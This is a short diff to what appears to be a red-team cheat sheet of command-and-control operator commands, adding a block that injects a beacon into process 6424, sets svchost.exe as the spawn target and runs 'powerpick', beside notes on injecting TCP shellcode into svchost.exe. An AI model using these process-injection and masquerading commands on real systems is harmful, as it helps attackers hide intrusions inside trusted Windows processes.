@@ -14,6 +14,13 @@ spawnto x64 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'
 powerpick command
 ```
 
+
+```powershell
+inject 6424 x64 http
+spawnto x64 C:\Windows\System32\svchost.exe
+powerpick command
+```
+
 #### TCP-Local (enum)
 
 Find svchost.exe  process and inject TCP shell code into it via GUI
